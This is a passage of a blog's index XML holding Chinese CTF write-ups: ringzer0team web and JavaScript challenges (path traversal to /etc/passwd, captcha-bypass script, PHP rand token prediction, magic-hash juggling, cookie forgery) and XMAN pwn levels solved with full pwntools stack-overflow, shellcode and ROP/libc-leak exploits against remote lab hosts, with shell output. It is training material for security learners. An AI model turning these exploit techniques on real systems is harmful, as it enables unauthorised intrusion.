xxe.xml中定义和引用了%payload2,在通过%dtd引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log: ctf小试牛刀拿jarvisoj平台上的题目来小试牛刀吧。 题目：api调用 题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值 xxe相关WP AliCTF-Quals-2014 WebA-300 HCTF-2016 大图书管的牧羊人&amp;&amp;魔法禁书目录 GoSecure-CTF-2015 web-300]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-web-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-web-writeup%2F</url>
      <content type="text"><![CDATA[ringzer0team-web Big Brother is watching题目地址： https://ringzer0team.com/challenges/212 题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦访问https://ringzer0team.com/robots.txt12User-agent: *Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/ 访问 https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/ 得到flag；1FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i Looking for password file题目地址：http://ringzer0team.com:1008/?page=lorem.php 读取password，猜测是passwd文件。访问：http://ringzer0team.com:1008/?page=/etc/passwd 得到flag:1FLAG-zH9g1934v774Y7Zx5s16t5ym8Z Area 51题目地址：https://ringzer0team.com/challenges/48 题目提示：Access to this area is restricted using some secure .htaccess .htaccess中可以限制各种请求。通过尝试后，抓包，改请求方式GET为PUT。得到flag：1FLAG-w4KRr557y626izv567758O52 Headache题目提示：Answer is closer than you think! head，所以我们抓包看头部。得到flag：1FLAG-365m4fU5p2DVEQbfrptDE5Ru] Words mean something?给了一段不知所云的文字。。不懂就抓包咯。抓包后在cookie处发现flag：0。修改后发包得到flag： flag:1FLAG-AnlAb6QxDpQvg1yn2bAhyOJw Admin Panel有一个登陆框，随便输点什么进去，抓包后发现一个302跳转，在跳转页面里有一个奇怪的东西，见下： 将方法改成GET请求，在尾部添加：?showflagforme=yesIwantafla。见下： 得到flag：1FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS Captcha I题目地址：http://captcha.ringzer0team.com:7421/form1.php测试一次后，题目提示说要验证一千次。查看源代码，可以发现如下js代码：1234567891011&lt;script&gt;function doIt()&#123; var A = document.getElementById('captcha-form').value; if (A == "ehage")&#123; document.forms["Form1"].submit(); &#125; else &#123; alert("BAD Captcha"); &#125;&#125;&lt;/script&gt; 其中if判断条件里的ehage就是当前的验证码，所以只要写脚本提取出这段字符串，然后再发包就行啦。脚本如下：123456789101112131415import requestscookie = &#123;'_ga':'GA1.2.1373385590.1498799275','_gid':'GA1.2.867459789.1498799275','_gat':'1','PHPSESSID':'1kr76vh1164sbgeflnngimi321'&#125;url = 'http://captcha.ringzer0team.com:7421'headers = &#123;'Authorization':'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='&#125;for i in range(1000): # get captacha r = requests.get("http://captcha.ringzer0team.com:7421/form1.php",cookies=cookie,headers=headers) start_addr = r.text.find('if (A == "') + len('if (A == "') end_addr = r.text.find('"',start_addr) captcha = r.text[start_addr:end_addr] print(i,":",captcha) k = requests.get("http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new",cookies=cookie,headers=headers) data = &#123;'captcha': captcha&#125; k = requests.post('http://captcha.ringzer0team.com:7421/captcha1.php',cookies=cookie,headers=headers,data=data) 跑完后得到flag：1Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot; Password reset有一个登陆框，需要用户名和密码，还有一个重置（reset）功能。题目提供了源码。如下：12345678910111213141516171819202122232425&lt;?phpif(isset($_POST['reset_username'])) &#123; srand(time()); $token = rand(1000000000000000,9999999999999999); $success = '&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...' $hSql-&gt;FastQuery('DELETE FROM chal_113 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR'])); $hSql-&gt;FastQuery('insert into chal_113 values (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600));&#125;if(URL_HANDLE::GetInstance()-&gt;get-&gt;k != null) &#123; $result = reset($hSql-&gt;FastQuery('SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()-&gt;get-&gt;k))); if($hSql-&gt;RowCount() != 0) &#123; if($result-&gt;expired_time &gt; time()) &#123; $success = '&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'; &#125; else &#123; $success = '&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'; &#125; &#125; else &#123; $success = '&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'; &#125;&#125;?&gt; 伪随机数问题，还有就是关于unix时间戳的知识。目标很明确要对admin重置密码，当点了reset后，会根据当前的time生成一个token并存放在数据库中，这个就是下文的k值。 注意图片中是：2017 06:39:41 -0400。记得计算上时差为4个小时。所以实际时间应该是2017-07-01 10:39:41。写一个php脚本，生成需要的16位的digit code。1234567&lt;?php$t = strtotime('2017-07-01 10:39:41');echo($t . "&lt;br&gt;");srand($t);$token = rand(1000000000000000,9999999999999999);echo $token;?&gt; 上面代码在win平台下无法生成16位的code，这个不知道为什么。。。我换到unix环境后生成的token为 32933381064794967。访问：1http://ringzer0team.com/challenges/113/?k=3293338106479496 得到hint：1Here&apos;s your new password: Thi%P@s50rD!sM1n3* 登陆，得到flag：1FLAG-DlwwTV7vCQf4Dn281Yhb802x5U PHP Fairy有一个登陆框。题目给了源码12345678910111213141516171819202122232425262728&lt;?php$output = "";if (isset($_GET['code'])) &#123; $content = file_get_contents(__FILE__); $content = preg_replace('/FLAG\-[0-9a-zA-Z_?!.,]+/i', 'FLAG-XXXXXXXXXXXXXXXXXXXXXXX', $content); echo '&lt;div class="code-highlight"&gt;'; highlight_string($content); echo '&lt;/div&gt;';&#125;if (isset($_GET['pass'])) &#123; if(!preg_match('/^[^\W_]+$/', $_GET['pass'])) &#123; $output = "Don't hack me please :("; &#125; else &#123; $pass = md5("admin1674227342"); if ((((((((($_GET['pass'] == $pass)))) &amp;&amp; (((($pass !== $_GET['pass']))))) || ((((($pass == $_GET['pass'])))) &amp;&amp; ((($_GET['pass'] !== $pass)))))))) &#123; // Trolling u lisp masta if (strlen($pass) == strlen($_GET['pass'])) &#123; $output = "&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125;&#125;?&gt; 考察php弱类型。经过md5加密后生成以0e开头的字符串，而以0e开头的字符串用==比较时会被转换成0 == 0即成立。而!== 不仅比较值，而且还会比较类型。所以我们只要传入pass的值为一个0e开头的值，并且长度为32位（$pass长度为32位），比如说：0e509367213418206700842008763514。 得到flag：1FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS Malicious upload 上传题，一般关注文件名后缀和content-type。经过fuzz：）知道，对filename，服务器端的检测时从左向右匹配.xxx，若遇到的第一个.xxx不是png则上传失败，另一个就是需要把content-type设置为image/png 得到flag：1FLAG-ve46i9UFtDh8Xd4hnqKRkP17 Security through obscurity!题目说：You don&#39;t have admin access.。一脸懵逼，抓包发现一个奇奇怪怪的cookie： 看着。。就很像base64加密；) 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode('Z3Vlc3QsZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LGZhbHNlOjIyOWQ3NDU5MmQ5MjNiOThlZjA3NjViNTU5OTkyZDI1')b'guest,e738b099a664e00e,1498908736,false:229d74592d923b98ef0765b559992d25' 后面那串感觉很像md5，解密无果。想想先尝试改改一些东西,，比如把guest改成admin，false改成true，base64加密后得到：1YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LHRydWU6MjI5ZDc0NTkyZDkyM2I5OGVmMDc2NWI1NTk5OTJkMjU= 所以基本可以断定后面那串是md5，发包后，提示之后我把原始的包，没有改过cookie的包直接fowward掉后提示说：1Expired cookie. 说明有时间限制，结合前面做过的题目推断1498908736是unix时间戳，它可以直接转换为2017/7/1 19:32:16。接下来，从整体上看一下这个cookie，它被冒号:分为两段。所以：1md5(&quot;guest,e738b099a664e00e,1498908736,false&quot;) =&gt; 229d74592d923b98ef0765b559992d25 不过，第二个值不清楚是如何生成的，也许只是个随机值。所以我们改一改，记得把unix时间戳改大一点不然会提示过期：123md5(&quot;admin,e738b099a664e00e,1498999999,true&quot;) =&gt; 05fda7a65b3ac89393e7de85bc8db295base64(&quot;admin,e738b099a664e00e,1498999999,true:05fda7a65b3ac89393e7de85bc8db295&quot;) =&gt; YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTk5OTk5LHRydWU6MDVmZGE3YTY1YjNhYzg5MzkzZTdkZTg1YmM4ZGIyOTU= 得到flag：1FLAG-Feg03OSzWhxO03K94108100f REST in peace题目提示：Your goal is to get superadmin access题目地址是：https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php直接访问会显示Access Denied。抓包后在响应包头部发现奇怪的东东，见下： 发现是sha512加密，简单咯： 将字符串admin经过sha512加密后，在请求包中添加Strong-Auth字段。发送后得到以下内容：1234Document title security levelThe secret of the universe.docx privateBe Better In Bed By Richard MacDonald.docx publicThis file may contain a flag or not.docx extremely private 然后，，然后我还没做出来。待续。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-js-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-js-writeup%2F</url>
      <content type="text"><![CDATA[未完待续..待续.. Client side validation is so secure? 查看源代码，发现下面的js123456789101112131415&lt;script&gt; // Look's like weak JavaScript auth script :) $(".c_submit").click(function(event) &#123; event.preventDefault() var u = $("#cuser").val(); var p = $("#cpass").val(); if(u == "admin" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125;);&lt;/script&gt; 用控制台运行一下得到密码为：12String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)&quot;JavaScriptIsSecure&quot; 填入账号admin，密码JavaScriptIsSecure，得到flag：1FLAG-66Jq5u688he0y46564481WRh Is hashing more secure?查看源代码，发现js：1234567891011$(".c_submit").click(function(event) &#123; event.preventDefault(); var p = $("#cpass").val(); if(Sha1.hash(p) == "b89356ff6151527e89c4f3e3d30c8e6586c63962") &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;&#125;); 工具网站：http://hashtoolkit.com得到密码为；adminz。填入，得到flag。1FLAG-bXNsYg9tLCaIX6h1UiQMmMYB Then obfuscation is more secure?1234&lt;script&gt; // Look's like weak JavaScript auth script :) var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var _0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );&lt;/script&gt; 拖到http://ddecode.com/解一下得到如下代码： 12345// Look's like weak JavaScript auth script :)var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(_0xc360[12])[_0xc360[11]](function() &#123; var _0xf382x1 = $(_0xc360[1])[_0xc360[0]](); var _0xf382x2 = _0xc360[2]; if (_0xf382x1 == _0xc360[3] + _0xf382x2) &#123; if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) &#123; document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1; &#125;; &#125; else &#123; $(_0xc360[10])[_0xc360[9]](_0xc360[8]); &#125;;&#125;); 自己再替换一下。总算能看了。 12345678910111213var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(".c_submit")["click"](function() &#123; var _0xf382x1 = $("#cpass")["val"](); var _0xf382x2 = "alk3"; if (_0xf382x1 == "02l1" + _0xf382x2) &#123; if (document["location"]["href"]["indexOf"]("?p=",) == -1) &#123; document["location"] = document["location"]["href"] + "?p=", + _0xf382x1; &#125;; &#125; else &#123; $("#cresponse")["html"]("&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;;&#125;); 所以密码是 02l1alk3，得到flag：1FLAG-5PJne3T8d73UGv4SCqN44DXj Why not?12345678910111213141516171819202122232425$(".c_submit").click(function(event) &#123; event.preventDefault(); var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = $("#cuser").val(); var p = $("#cpass").val(); var t = true; if(u == "administrator") &#123; for(i = 0; i &lt; u.length; i++) &#123; if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; break; &#125; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125;&#125;); 写一个js脚本。123456789&lt;script&gt; var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = "administrator"; var p = ""; for (i = 0; i &lt; u.length; i++)&#123; p += String.fromCharCode(k[i] - i * 10 - u.charCodeAt(i) ); &#125; alert(p);&lt;/script&gt; 弹框得到结果：OhLord4309111，得到flag：1FLAG-65t23674o6N2NehA44272G24 Valid key required1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;script&gt; function curry( orig_func ) &#123; var ap = Array.prototype, args = arguments; function fn() &#123; ap.push.apply( fn.args, arguments ); return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args ); &#125; return function() &#123; fn.args = ap.slice.call( args, 1 ); return fn.apply( this, arguments ); &#125;; &#125; function callback(x,y,i,a) &#123; return !y.call(x, a[a["length"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;; &#125; var ref = &#123;T : "BG8",J : "jep",j : "M2L",K : "L23",H : "r1A"&#125;; function validatekey() &#123; e = false; var _strKey = ""; try &#123; _strKey = document.getElementById("key").value; var a = _strKey.split("-"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + _strKey; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125; function equal(o,o1) &#123; var keys1 = Object.keys(o1); var keys = Object.keys(o); if(keys1.length != keys.length) return false; for(var i=0;i&lt;keys.length;i++) if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]]) return false; return true; &#125; function hook(f1,f2,f3) &#123; return function(x) &#123; return f2(f1(x),f3(x));&#125;; &#125; var h = curry(hook); var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function("a","b","return a &amp;&amp; b;")); function genFunc(_part) &#123; if(!_part || !(_part.length) || _part.length !== 4) return function() &#123;&#125;; return new Function(_part.substring(1,3), "this." + _part[3] + "=" + _part.slice(1,3) + "+" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : "'"+ _part[0] + "'")); &#125;&lt;/script&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN-pwn-writeup]]></title>
      <url>%2F2017%2F06%2F29%2FXMAN-pwn-writeup%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路 level 0 x64分析main函数： vuln函数: 用strings可以看到，有/bin/sh，这样我们不用再去写入了。 exp12345678910111213141516from pwn import *p = remote("pwn2.jarvisoj.com",9881)elf = ELF("./level0")offset = 0x80 + 8system_addr = elf.symbols['system']sh_addr = next(elf.search('/bin/sh'))pop_rdi_ret_addr = 0x0000000000400663payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/0$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done[*] &apos;/home/chybeta/pwn/ctf/xman/0/level0&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeHello, World$ lsflaglevel0_x64$ cat flagCTF&#123;713ca3944e92180e0ef03171981dcd41&#125; level 1分析main函数； vulnerable_function函数： 很明显的栈溢出漏洞。溢出点用pattern查出为140个字节。用checksec看后发现NX没有开启，可以插入shellcode。题目也给出了buf的地址。因此可以在buf数组中插入shellcode，然后再溢出跳转到buf的起始位置去执行shellcode。 exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9877)# p = process("./level1")elf = ELF("./level1")p.recvuntil("What's this:")buf_addr = p.recvuntil("?")[:-1]buf_addr = int(buf_addr,16)offset = 140shellcode = asm(shellcraft.sh())payload = shellcodepayload = payload.ljust(140,'a')payload += p32(buf_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/xman1$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done[*] &apos;/home/chybeta/pwn/ctf/xman/xman1/level1&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE[*] Switching to interactive mode$$ lsflaglevel1$ cat flagCTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125; level 2分析main函数 vulnerable_function函数： 这题用strings查看时，会发现有/bin/sh字符串，不需要我们再去写入了。用gdb去调试，没成功，栈被重置了。不过从vuln函数里可以很清楚的看到，它先调用了一次system，而且read中存在栈溢出漏洞。而且buf的地址在bp-88h的位置。从内存的分布知道，当前栈帧的ebp再减去4个字节就是return的地址。所以溢出的offset同样是 0x88 + 4。所以这题的思路就是，覆盖返回地址，跳转到system，构造栈上的参数，给system传入sh/。 exp1234567891011121314from pwn import *p = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")offset = 0x88 + 4sh_addr = next(elf.search('/bin/sh'))payload = 'a' * offsetpayload += p32(elf.symbols['system'])payload += p32(1) #paddingpayload += p32(sh_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/2$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2/level2&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2$ cat flagCTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;$ level 2 x64分析换成64位版本，参数要用rdi传递。binary中有sh字符串，直接利用就可以。这题似乎跟level0差不多啊。。 exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9882)# p = process("./level2_x64")elf = ELF("./level2_x64")offset = 0x80 + 8pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1system_plt = elf.plt['system']sh_addr = next(elf.search("/bin/sh"))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_plt)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/2x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9882: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2x64/level2_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2_x64$ cat flagCTF&#123;081ecc7c8d658409eb43358dcc1cf446&#125; level 3分析main函数跟前面一样。 vuln函数: 仍然是栈溢出。题目给了libc.so，这样我们就有偏移。利用write泄露出read的地址后计算出system和sh的地址，之后直接调用即可。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p = remote("pwn2.jarvisoj.com",9879)elf = ELF("./level3")libc = ELF("./libc-2.19.so")p.recvuntil("Input:\n")offset = 0x88 + 4read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search("/bin/sh"))read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']payload = 'a' * offsetpayload += p32(write_plt)payload += p32(vuln_addr)payload += p32(1)payload += p32(read_got)payload += p32(4)p.sendline(payload)read_addr = u32(p.recv(4))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(sh_addr)p.sendline(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3/level3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3/libc-2.19.so&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] system address =&gt; 0xf763a310[+] sh address =&gt; 0xf775a84c[*] Switching to interactive mode$ lsflaglevel3$ cat flagCTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;$ exp（无libc版本）假设题目没有给libc的话，可以用下面这个exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *#p = process("./level3")p = remote("pwn2.jarvisoj.com",9879)# p = remote("127.0.0.1",12345)elf = ELF("./level3")pop3addr = 0x08048519offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']start_addr = elf.symbols['_start']main_addr = elf.symbols['main']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.sendline(payload) address = p.recv(4) return addressd = DynELF(leak, elf=ELF("./level3"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(100)# payload +=payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.sendline(payload)p.sendline(sh)p.interactive() 这个exp几乎和level4的相同，所以具体的一些坑就见下面吧。 level 3 x64分析函数啥的，跟前面的level3一样。参数用rdi，rsi等寄存器优先传递。构造rop链。 exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *p = remote("pwn2.jarvisoj.com",9883)elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")offset = 0x80 + 8read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh\x00'))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_ret_addr)payload += p64(read_got)payload += p64(1)payload += p64(write_plt)payload += p64(vuln_addr)p.send(payload)read_addr = u64(p.recv(8))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9883: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/level3_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/libc-2.19.so&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] read address =&gt; 0x7f5c484726a0[+] system address =&gt; 0x7f5c483cd590[+] sh address =&gt; 0x7f5c485038c3[*] Switching to interactive mode$ lsflaglevel3_x64$ cat flagCTF&#123;b1aeaa97fdcc4122533290b73765e4fd&#125; level 4分析main()函数和前同。 vuln函数： 没给libc，自己利用栈溢出和DynELF来泄露system地址。完了后调用read函数往bss段写入sh字符串，最后完成调用。这个思路很老套了。不过自己写的时候踩了很多坑，列举如下： leak函数中，若每次leak完后跳转到vuln函数地址，则远程getshell不成功，尽管本地测试可以。 leak函数中，需要在leak后先pop3把栈上参数清空后再进行跳转到main函数中，否则本地或远程getshell都不成功。 在泄露完system地址后，若再调用一次start函数以恢复栈，则远程getshell不成功，尽管本地测试可以。 还有一些… 以上几点，在以前利用时没遇到过，这次想了很久也不知道为什么。。。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *# p = process("./level4")p = remote("pwn2.jarvisoj.com",9880)# p = remote("127.0.0.1",12345)elf = ELF("./level4")pop3addr = 0x08048509offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']main_addr = elf.symbols['main']start_addr = elf.symbols['_start']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) # p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.send(payload) data = p.recv(4) return datad = DynELF(leak, elf=ELF("./level4"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(len(sh))payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.send(payload)p.send(sh)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/4$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done[*] &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] leaking address =&gt; 0x80480000x8048000 \x7fELF[+] Loading from &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos;: 0xf77fb930[*] leaking address =&gt; 0x804a004..........[+] system address =&gt; 0xf769be80[*] Switching to interactive mode$$$ lsflaglevel4$ cat flagCTF&#123;882130cf51d65fb705440b218e94e98e&#125; :)文件已打包：http://pan.baidu.com/s/1eR2XzNk 密码：9y4l12345678910111213141516171819202122232425xman├── 0│ ├── exp.py│ └── level0├── 1│ ├── exp.py│ └── level1├── 2│ ├── exp.py│ └── level2├── 2x64│ ├── exp.py│ └── level2_x64├── 3│ ├── exp2.py│ ├── exp.py│ ├── level3│ └── libc-2.19.so├── 3x64│ ├── exp.py│ ├── level3_x64│ └── libc-2.19.so└── 4 ├── exp.py └── level4]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SUCTF-2016-pwn400-writeup]]></title>
      <url>%2F2017%2F06%2F28%2FSUCTF-2016-pwn400-writeup%2F</url>
